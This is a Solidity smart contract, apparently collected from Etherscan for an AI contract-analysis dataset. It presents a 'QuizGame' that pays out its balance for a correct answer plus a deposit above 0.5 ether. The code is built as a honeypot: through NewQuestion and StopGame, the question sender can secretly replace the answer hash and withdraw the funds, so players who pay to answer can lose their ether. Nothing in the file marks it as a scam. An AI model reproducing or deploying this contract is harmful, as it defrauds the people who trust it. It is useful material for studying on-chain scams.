/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.20;

contract QuizGame
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>0.5 ether && !closed)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }


    string public question;

    address questionSender;

    bool public closed = false;

    bytes32 responseHash;

    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }

    function StopGame()
    public
    payable
    {
       require(msg.sender == questionSender);
       if (closed){
           msg.sender.transfer(this.balance);
       }else{
           closed = true;
       }
    }

    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender == questionSender);
        question = _question;
        responseHash = _responseHash;
    }

    function GiftHasBeenSent()
    private
    {
        closed = true;
    }

    function() public payable{}
}